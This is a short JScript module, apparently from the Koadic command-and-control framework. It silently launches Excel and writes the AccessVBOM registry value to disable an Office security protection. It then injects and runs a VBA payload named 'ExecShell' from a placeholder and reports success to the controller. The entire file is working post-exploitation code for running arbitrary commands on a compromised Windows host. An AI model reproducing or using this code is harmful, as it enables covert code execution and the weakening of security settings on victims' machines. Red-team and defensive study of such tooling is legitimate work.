try {
    var objExcel = new ActiveXObject("Excel.Application");
    objExcel.Visible = false;
    var Application_Version = objExcel.Version;//Auto-Detect Version
    var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\Excel\\Security\\AccessVBOM";

    var WshShell = new ActiveXObject("WScript.Shell");
    WshShell.RegWrite(strRegPath, 1, "REG_DWORD");
    var objWorkbook = objExcel.Workbooks.Add();
    var xlmodule = objWorkbook.VBProject.VBComponents.Add(1);

    strCode = '~VBACODE~'

    xlmodule.CodeModule.AddFromString(strCode);
    var wut = "ExecShell";
    objExcel.Run(wut);
    objExcel.DisplayAlerts = false;
    objWorkbook.Close(false);

    Koadic.work.report("Success");
} catch (e) {
    Koadic.work.error(e);
}

Koadic.exit();
